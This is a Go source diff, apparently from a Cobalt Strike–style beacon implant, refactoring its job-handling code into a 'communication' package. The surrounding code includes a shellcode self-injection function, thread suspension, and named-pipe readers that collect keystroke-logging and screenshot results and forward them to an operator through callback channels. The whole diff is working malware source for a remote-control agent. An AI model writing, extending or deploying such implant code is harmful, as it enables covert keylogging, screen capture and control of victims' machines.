@@ -10,6 +10,7 @@ import (
 	"github.com/Microsoft/go-winio"
 	"golang.org/x/sys/windows"
 	"io"
+	"main/communication"
 	"main/util"
 	"syscall"
 	"time"
@@ -38,6 +39,7 @@ var (
 	SuspendThread       = kernel32.NewProc("SuspendThread")
 	PeekNamedPipe       = kernel32.NewProc("PeekNamedPipe")
 	GetFileTime         = kernel32.NewProc("GetFileTime")
+	SetThreadPriority   = kernel32.NewProc("SetThreadPriority")
 	//HeapLock = kernel32.NewProc("HeapLock")
 	//HeapUnlock = kernel32.NewProc("HeapUnlock")
 
@@ -277,7 +279,7 @@ func InjectSelf(sh []byte) ([]byte, error) {
 
 }
 
-func convertData2UTF8(buf []byte) ([]byte, error) {
+func ConvertData2UTF8(buf []byte) ([]byte, error) {
 	buff := bytes.NewBuffer(buf)
 	data, err := util.ParseAnArgLittle(buff)
 	if err != nil {
@@ -285,7 +287,7 @@ func convertData2UTF8(buf []byte) ([]byte, error) {
 	}
 	offset := len(buf) - buff.Len()
 
-	UTF8Data, err := CodepageToUTF8(data)
+	UTF8Data, err := communication.CodepageToUTF8(data)
 	if err != nil {
 		return nil, err
 	}
@@ -300,7 +302,7 @@ func convertData2UTF8(buf []byte) ([]byte, error) {
 	return retBuf, nil
 }
 
-func convertWinUser2UTF8(buf []byte) ([]byte, error) {
+func ConvertWinUser2UTF8(buf []byte) ([]byte, error) {
 	buff := bytes.NewBuffer(buf)
 	_, err := util.ParseAnArgLittle(buff)
 	if err != nil {
@@ -321,9 +323,9 @@ func convertWinUser2UTF8(buf []byte) ([]byte, error) {
 	if err != nil {
 		return nil, err
 	}
-	windowsName, err = CodepageToUTF8(windowsName)
+	windowsName, err = communication.CodepageToUTF8(windowsName)
 	if err != nil {
-		ErrorProcess(errors.New("result error"))
+		communication.ErrorProcess(errors.New("result error"))
 	}
 
 	buf = buf[:offset+4]
@@ -345,9 +347,9 @@ func HandlerJob(b []byte) ([]byte, error) {
 	sleepTimeByte := make([]byte, 2)
 	_, _ = buf.Read(callbackTypeByte)
 	_, _ = buf.Read(sleepTimeByte)
-	callbackType := int(ReadShort(callbackTypeByte))
+	callbackType := int(communication.ReadShort(callbackTypeByte))
 
-	sleepTime := ReadShort(sleepTimeByte)
+	sleepTime := communication.ReadShort(sleepTimeByte)
 	pipeName, err := util.ParseAnArg(buf)
 	if err != nil {
 		return nil, err
@@ -367,30 +369,27 @@ func HandlerJob(b []byte) ([]byte, error) {
 		go func() {
 			result, err := ReadNamedPipe(pipeName, callbackType, sleepTime)
 			if err != nil {
-				ErrorProcess(err)
+				communication.ErrorProcess(err)
 				return
 			}
-			DataProcess(callbackType, []byte(result))
-			DataProcess(0, []byte("Job success"))
+			communication.DataProcess(callbackType, []byte(result))
+			communication.DataProcess(0, []byte("Job success"))
 		}()
 		return []byte("Hold on"), nil
 	}
 
 	result, err := ReadNamedPipeAll(pipeName)
-
-	if result != "" {
-		if callbackType == CALLBACK_SCREENSHOT {
-			resultBytes, err := convertWinUser2UTF8([]byte(result[4:]))
+	resultBytes := []byte(result)
+	if len(resultBytes) > 0 {
+		if callbackType == CALLBACK_SCREENSHOT && len(resultBytes) > 4 {
+			resultBytes, err = ConvertWinUser2UTF8(resultBytes[4:])
 			if err != nil {
-				ErrorProcess(err)
+				communication.ErrorProcess(err)
 			}
-
-			DataProcess(callbackType, resultBytes)
-		} else {
-			DataProcess(callbackType, []byte(result))
 		}
+		communication.DataProcess(callbackType, resultBytes)
 	} else {
-		ErrorProcess(errors.New("result error"))
+		communication.ErrorProcess(errors.New("result error"))
 	}
 
 	if err != nil {
@@ -416,26 +415,23 @@ func ReadNamedPipe(pipeName []byte, callbackType int, sleepTime uint16) (string,
 			}
 			break
 		}
-		var send []byte
+		resultBytes := buf[:n]
 		if n > 0 {
-			resultBytes := buf[:n]
 			if callbackType == CALLBACK_KEYSTROKES && len(resultBytes) > 4 {
-				send, err = convertWinUser2UTF8(resultBytes)
+				resultBytes, err = ConvertWinUser2UTF8(resultBytes)
 				if err != nil {
-					fmt.Printf("convertWinUser2UTF8 error: %v\n", err)
+					communication.ErrorProcess(err)
 				}
-				send, err = convertData2UTF8(send)
+				resultBytes, err = ConvertData2UTF8(resultBytes)
 				if err != nil {
-					fmt.Printf("convertData2UTF8 error: %v\n", err)
+					communication.ErrorProcess(err)
 				}
-			} else {
-				send = resultBytes
 			}
 
-			DataProcess(callbackType, send)
+			communication.DataProcess(callbackType, resultBytes)
 			time.Sleep(time.Millisecond * time.Duration(sleepTime))
 		}
-		result += string(send)
+		result += string(resultBytes)
 	}
 	return result, nil
 }
